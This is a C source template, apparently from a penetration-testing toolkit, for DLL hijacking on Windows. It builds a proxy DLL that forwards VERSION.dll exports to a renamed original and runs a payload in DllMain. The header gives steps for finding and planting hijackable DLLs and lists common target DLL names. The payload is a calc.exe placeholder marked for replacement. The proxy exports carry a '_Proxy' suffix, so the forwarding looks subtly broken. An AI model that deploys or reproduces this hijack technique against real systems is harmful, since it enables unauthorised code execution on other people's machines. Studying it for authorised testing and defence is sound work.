/*
 * DLL Hijack Template — Proxying + Code Execution
 *
 * This template proxies calls to the legitimate DLL while executing payload.
 * Use when the target app loads a DLL from a writable/user-controlled path.
 *
 * Steps:
 *   1. Use find_missing_dlls.ps1 or Process Monitor to identify hijackable DLLs
 *   2. Copy the legitimate DLL as <name>_orig.dll
 *   3. Compile this as <name>.dll
 *   4. Place both in the application directory
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -shared -o VERSION.dll dll_hijack_template.c
 *   cl /LD dll_hijack_template.c /Fe:VERSION.dll
 *
 * Common hijackable DLLs:
 *   VERSION.dll, USERENV.dll, WINMM.dll, WTSAPI32.dll,
 *   dwmapi.dll, UxTheme.dll, PROPSYS.dll, ntmarta.dll,
 *   CRYPTSP.dll, profapi.dll
 */

#include <windows.h>

// ============================================================
// PAYLOAD SECTION — Replace with your PoC
// ============================================================

void payload(void) {
    // PoC: Pop calc
    WinExec("calc.exe", SW_SHOW);

    // Alternative: Write a marker file (silent PoC)
    // HANDLE hFile = CreateFileA("C:\\temp\\dll_hijack_poc.txt",
    //     GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    // const char* msg = "DLL Hijack PoC - Code Execution Achieved\n";
    // DWORD written;
    // WriteFile(hFile, msg, strlen(msg), &written, NULL);
    // CloseHandle(hFile);
}

// ============================================================
// DLL PROXY SECTION — Forward exports to the real DLL
// ============================================================

// Adjust the original DLL name to match your target
#define ORIG_DLL "VERSION_orig.dll"

typedef void (*VOID_FUNC)(void);
static HMODULE hOrigDll = NULL;

FARPROC GetOrigFunc(const char* funcName) {
    if (!hOrigDll) {
        hOrigDll = LoadLibraryA(ORIG_DLL);
    }
    if (hOrigDll) {
        return GetProcAddress(hOrigDll, funcName);
    }
    return NULL;
}

// Example: Proxy exports for VERSION.dll
// Use dumpbin /exports or PE-bear to list exports of the real DLL,
// then add proxy stubs for each export.

// GetFileVersionInfoA
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoA_Proxy(
    LPCSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {
    typedef BOOL (WINAPI *pFunc)(LPCSTR, DWORD, DWORD, LPVOID);
    pFunc orig = (pFunc)GetOrigFunc("GetFileVersionInfoA");
    if (orig) return orig(lptstrFilename, dwHandle, dwLen, lpData);
    return FALSE;
}

// GetFileVersionInfoSizeA
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeA_Proxy(
    LPCSTR lptstrFilename, LPDWORD lpdwHandle) {
    typedef DWORD (WINAPI *pFunc)(LPCSTR, LPDWORD);
    pFunc orig = (pFunc)GetOrigFunc("GetFileVersionInfoSizeA");
    if (orig) return orig(lptstrFilename, lpdwHandle);
    return 0;
}

// ============================================================
// DLL ENTRY POINT
// ============================================================

static BOOL payloadExecuted = FALSE;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        if (!payloadExecuted) {
            payloadExecuted = TRUE;
            // Run payload in a new thread to avoid loader lock deadlock
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
        }
        break;
    case DLL_PROCESS_DETACH:
        if (hOrigDll) FreeLibrary(hOrigDll);
        break;
    }
    return TRUE;
}
